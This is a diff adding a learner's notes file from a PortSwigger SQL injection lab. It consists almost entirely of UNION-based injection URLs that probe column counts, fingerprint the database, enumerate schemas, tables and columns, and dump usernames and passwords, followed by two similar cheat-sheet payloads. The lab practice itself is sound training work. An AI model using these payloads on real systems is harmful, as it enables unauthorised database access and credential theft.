@@ -1,0 +1,21 @@
+Sqli lab
+
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
+
+https://acd91f721f00acf880a29ee600e00091.web-security-academy.net/filter?category=Pets'order+by+2--
+https://acd91f721f00acf880a29ee600e00091.web-security-academy.net/filter?category=Pets%27+union+select+null,null,null--
+https://acd91f721f00acf880a29ee600e00091.web-security-academy.net/filter?category=Pets%27+union+select+null,null--
+https://acd91f721f00acf880a29ee600e00091.web-security-academy.net/filter?category=Pets%27+union+select+null,@@version+--
+https://acd91f721f00acf880a29ee600e00091.web-security-academy.net/filter?category=Pets%27+union+select+null,version()+--
+https://acd91f721f00acf880a29ee600e00091.web-security-academy.net/filter?category=Pets%27+union+select+null,concat(schema_name)+FROM+information_schema.schemata--
+https://acd91f721f00acf880a29ee600e00091.web-security-academy.net/filter?category=Pets%27+union+select+null,concat(TABLE_NAME)+FROM+information_schema.TABLES+WHERE+table_schema='public'--
+https://acd91f721f00acf880a29ee600e00091.web-security-academy.net/filter?category=Pets%27+union+select+null,concat(column_name)+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME='users'--
+https://acd91f721f00acf880a29ee600e00091.web-security-academy.net/filter?category=Pets%27+union+select+null,concat(username,' ',password)+FROM+users--
+
+
+https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
+
+1 UNION ALL SELECT NULL,concat(column_name)+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME='users'--
+
+
+1 UNION ALL SELECT NULL,concat(0x28,username,0x3a,password,0x29)+FROM+users--
